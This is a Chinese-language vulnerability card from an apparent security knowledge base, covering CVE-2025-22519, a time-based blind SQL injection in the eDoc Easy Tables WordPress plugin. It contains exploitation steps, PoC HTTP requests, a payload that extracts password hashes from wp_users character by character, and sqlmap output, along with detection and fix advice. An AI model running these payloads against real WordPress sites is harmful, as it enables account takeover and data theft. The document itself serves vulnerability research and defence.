---
id: web-generic-sqli-wordpress-edoc-easy-tables-table-id-double-splice
title: eDoc Easy Tables table-id 直接拼进表名：同参数两处拼接、SLEEP 被执行两次的时间盲注（CVE-2025-22519）
type: scenario
domain: web
path: web/generic/sqli
technique: wordpress-edoc-easy-tables-table-id-table-name-splice
tags:
- wordpress
- plugin
- sqli
- time-based-blind
- table-name-splice
- php
- mysql
- cve-2025-22519
cve:
- CVE-2025-22519
severity: high
confidence: high
affected_versions: eDoc Easy Tables <= 1.2.6
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:11:12+08:00'
  notes: 已对照原文与 5 张图核对：affected_versions<=1.2.6 与原文一致；capability=read、menu_slug dp-table-admin/edit-tables、callback edoc_wpet_edit_tables_page(图02)一致；table-id 拼表名与 WHERE id=、DELETE/DROP 复用(图01/04)一致；PoC 请求行与图03、sqlmap 输出(图05)一致。已修正两处：成因中「先跑 SELECT 再跑 DELETE 造成两次执行」的推断有误，改为原文口径(普通 edit-tables 请求即约 6.1s，原文只写被执行两次、未标明翻倍代码位置)；删除「可匿名性」措辞(菜单 capability=read 说明需登录低权限账号，非未认证可达)。未验证点：未复跑 PoC、未访问目标、未确认翻倍的精确代码路径。
url: /docs/web/generic/sqli/web-generic-sqli-wordpress-edoc-easy-tables-table-id-double-splice/
draft: false
kb_aliases:
- CVE-2025-22519
- eDoc Easy Tables SQL 注入
- edoc_wpet_edit_tables_page
- table-id 注入
- dp-table-admin 注入
- 表名拼接 注入
- 同一参数两次执行
---

## 一句话结论

eDoc Easy Tables（≤1.2.6）的 `edoc_wpet_edit_tables_page()` 从 `$_GET['table-id']` 取值后，既拼进表名（`$wpdb->prefix . "edoc_table_" . $table_id`）又直接拼进 `WHERE id=$table_id`，全无 `prepare`/`intval`；订阅者权限账号访问 `wp-admin/admin.php?page=edit-tables&table-id=<payload>` 即触发，注入语句在该页面里被执行两次，所以 `SLEEP(3)` 实测延迟约 6 秒，可稳定做时间盲注读库。

## 原理

- 数据流：菜单注册把 `edit-tables` 的 callback 指向 `edoc_wpet_edit_tables_page`（`capability` 为 `read`，见触发条件）→ 函数第一行 `$table_id = @$_GET['table-id']` → 立刻用于拼表名 `$table_name_edit = $wpdb->prefix . "edoc_table_" . $table_id` → 后续 `DROP TABLE $table_name_edit`、`SELECT * FROM $table_name_admin WHERE id=$table_id`、`DELETE FROM ... WHERE ... = $table_id` 全部沿用该值。
- 两处不同性质的拼接：①**表名位置**（`edoc_table_` 前缀后直接接用户输入）——这是最难过滤的位置，白名单/转义通常只作用于值，表名拼接受输入影响最大；②**值位置**（`WHERE id=$table_id`，无引号包裹）——数字型注入，`1 AND (SELECT ...)` 直接成立。
- 「被执行两次」是原文给的定量观测：不带 `actions=delete` 的普通页面请求 `admin.php?page=edit-tables&table-id=5 union select 1,sleep(3) --+` 实测响应约 6.1 秒，即同一 payload 在该渲染分支里被执行了两次（原文只写「被执行了两次」，未标明翻倍的确切代码位置）；`actions=delete` 分支另有 `DELETE FROM $table_name_edit WHERE id=$table_id` 与 `DROP TABLE $table_name_edit` 复用同一取值，会再叠加执行次数（需先通过 `wp_verify_nonce($_GET['delete'],'doing_delete')`）。因此时间盲注的延迟等于 `SLEEP(n) × 执行次数`，payload 写 `SLEEP(3)` 得到约 6 秒；这个倍数关系是判定注入点是否就是同一参数的快速指纹，做盲注脚本前必须先实测基准倍数。
- 可达人群取决于菜单 `capability`：该菜单用 `read`（WordPress 中最弱的角色能力，订阅者即具备），所以**任何已登录的低权限用户**都能进入该后台页面（非未认证可达）；若站点开放注册（默认订阅者），攻击面就从管理员扩到任意注册用户。
- 修复方向是 `$wpdb->prepare()` + 对 `table-id` 做 `intval`/白名单校验，并在拼表名前用固定的表名映射（不接受外部输入拼表名）。

## 触发条件

- WordPress 站点安装并启用 eDoc Easy Tables ≤1.2.6（原文标记受影响区间 `<= 1.2.6`，测试环境 WordPress 6.7.1）。
- 攻击者拥有至少订阅者（`read`）权限的账号；站点开放注册或已有低权限账号即可。
- 插件后台菜单 `dp-table-admin` / `edit-tables` 可访问（`admin.php?page=edit-tables`）。
- 数据库为 MySQL/MariaDB（`SLEEP` 可用）。

## 利用步骤

1. 用低权限账号登录 `wp-admin`，访问 `admin.php?page=edit-tables`，确认页面正常渲染（说明 `read` 能力足够）。
2. 在 `table-id` 后追加 ` AND (SELECT SLEEP(3))`，对比响应耗时（原文明示约 6 秒，因同一语句执行两次）。
3. 用 `sqlmap` 复现原始请求（带 Cookie），或直接手注：把 `SLEEP(3)` 换成按位条件，如 `1 AND (SELECT IF(SUBSTR((SELECT user_pass FROM wp_users LIMIT 1),1,1)='$',SLEEP(3),0))`。
4. 逐字符提取 `wp_users.user_pass`、`wp_options` 中的密钥等；或先取 `database()`、`version()`。
5. 若表名位置可注入（`edoc_table_` 后），可尝试子查询/联合读取，但值位置（`WHERE id=`）更稳定，优先用值位置。
6. 记录实际延迟倍数（确认「两次执行」），作为后续盲注脚本的基准。

## PoC

```http
GET /wp-admin/admin.php?page=edit-tables&table-id=5%20union%20select%201%20,sleep(3)%20--+ HTTP/1.1
Host: target
Cookie: wordpress_logged_in_<hash>=<user>|<expiry>|<token>|<sig>
```

```text
# 响应：HTTP/1.1 200 OK，耗时约 6.1 秒（同一语句被执行两次，故 SLEEP(3) 表现为 ~6s）
```

```http
GET /wp-admin/admin.php?page=dp-table-admin&table-id=1&actions=delete&delete=c8c1f04952 HTTP/1.1
Host: target
```

```text
# sqlmap 识别结果（原文）
Parameter: table-id (GET)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: page=dp-table-admin&table-id=1 AND (SELECT 1195 FROM (SELECT(SLEEP(5)))gKYg)&actions=delete&delete=c8c1f04952
```

## 变体与关联

- 变体：`table-id` 落在表名位置时，可注入反引号/子查询改变表名解析（如 `1\` UNION SELECT ...`），但需注意 `$wpdb->prefix` 前置拼接的引号闭合方式。
- 变体：`actions=delete` 分支要求 `wp_verify_nonce($_GET['delete'], 'doing_delete')` 通过，因此该分支需要先取到 nonce；`edit-tables` 默认渲染分支则不需要，优先用默认分支做盲注。
- 变体：延迟倍数可用于区分「同一参数被拼进几条语句」；若目标改了执行次数，基准要重测。
- 关联：`[[web-generic-sqli-geo-my-wordpress-boundary-time-blind]]` 是另一个 WordPress 插件的未授权时间盲注（值位置注入、explode 拆分），本卡的特点在**表名位置拼接** + **同参数两次执行**；`[[web-generic-sqli-wordpress-plugin-order-by-time-blind]]` 是 ORDER BY 位置的裸拼注入。
- 边界：插件版本高于 1.2.6、站点关闭注册且攻击者无低权限账号、`table-id` 被 `intval`、数据库非 MySQL 时链断或降级。

## 检测与防御

- 检测：`admin.php?page=edit-tables|dp-table-admin` 请求中 `table-id` 含 `SLEEP`/`AND (`/`UNION`/`select`；同一 URL 反复请求且响应耗时离散；低权限账号（订阅者）访问插件后台页面。
- 修复：`table-id` 一律 `intval()` 或严格数字校验；表名用服务端固定映射（`$wpdb->prefix . 'edoc_table_' . $validated_id`），禁止外部输入拼进表名；所有查询使用 `$wpdb->prepare()`。
- 加固：插件后台菜单把 `capability` 从 `read` 提升为 `manage_options`，避免订阅者触及管理页面；数据库账号最小权限（禁止 `DROP`）；对插件后台路径做低权限角色访问审计。
